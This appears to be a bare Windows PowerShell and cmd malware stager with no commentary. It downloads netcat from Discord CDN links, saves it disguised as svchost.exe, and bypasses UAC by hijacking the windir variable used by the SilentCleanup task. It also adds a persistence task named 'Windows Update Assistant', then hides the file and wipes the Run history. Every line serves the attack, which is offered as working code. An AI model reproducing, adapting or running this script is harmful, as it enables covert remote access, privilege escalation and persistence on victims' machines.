cd $env:public
$url1="https://cdn.discordapp.com/attachments/819760873919741972/948252292967182356/nc64.exe"
$url2="https://cdn.discordapp.com/attachments/819760873919741972/948253096994287626/x.xml"
$path1="$env:public\svchost.exe"
$path2="$env:public\x.xml"
(new-object net.webclient).downloadfile($url1,$path1)
(new-object net.webclient).downloadfile($url2,$path2)
cmd /r 'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f&reg add "HKCU\Environment" /v "windir" /d "%comspec% /r mode 18,1&cd %public%&schtasks /create /tn \"Windows Update Assistant\" /f /xml x.xml >nul&schtasks /run /tn \"Windows Update Assistant\" /i >nul&REM "&timeout /t 1&schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul&timeout /t 1&reg delete "HKCU\Environment" /v "windir" /F&attrib +s +h svchost.exe&del /q x.xml'
